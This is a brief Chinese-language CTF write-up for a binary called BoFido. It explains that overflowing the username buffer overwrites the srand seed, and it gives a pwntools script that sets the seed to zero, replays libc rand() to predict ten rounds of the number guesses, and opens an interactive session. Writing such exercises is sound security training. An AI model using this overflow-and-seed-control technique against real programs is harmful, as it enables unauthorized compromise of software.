根据elf文件中main可以看出主要逻辑为读取一个用户名然后进行猜数字
再读取用户名时可以溢出到rand(seed)的seed，然后就得到随机数
故可以得到exp
exp如下
```
from pwn import *
from ctypes import *
context.log_level = 'debug'
sh = process("./BoFido")
payload=b'a'*0x20+p32(0)
sh.sendafter('Enter your name:',payload)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0)
for  i in range(10):
    num = ""
    num += str(libc.rand() % 255)
    num +=' '
    num += str(libc.rand() % 255)
    num +=' '
    num += str(libc.rand() % 255)
    print(num)
    sh.sendlineafter("choose your numbers:",num)
sh.interactive()
```